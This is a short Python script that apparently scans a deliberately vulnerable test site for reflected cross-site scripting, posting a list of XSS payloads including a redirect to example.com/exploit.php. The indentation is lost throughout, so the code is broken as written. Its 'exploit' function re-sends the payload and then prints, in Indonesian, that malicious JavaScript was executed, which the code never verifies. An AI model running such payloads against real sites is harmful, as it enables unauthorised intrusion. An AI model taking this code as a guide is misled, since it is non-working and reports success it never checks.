import requests
from bs4 import BeautifulSoup

def find_xss_vulnerability(url, payload):
response = requests.post(url, data = {
    "query": payload
})

if response.status_code == 200:
soup = BeautifulSoup(response.text, "html.parser")

for script in soup.find_all("script"):
if payload in script.text:
return True

return False

def exploit_xss_vulnerability(url, payload):
response = requests.post(url, data = {
    "query": payload
})

if response.status_code == 200:
print("Kerentanan XSS ditemukan!")
print("Kode JavaScript berbahaya telah dieksekusi!")

if __name__ == "__main__":
url = "http://testphp.vulnweb.com/index.php"
payloads = ["<script>alert('XSS!');</script>", "<img src=x onerror=alert('XSS!');>", "window.location = 'https://example.com/exploit.php'"]

for payload in payloads:
if find_xss_vulnerability(url, payload):
exploit_xss_vulnerability(url, payload)
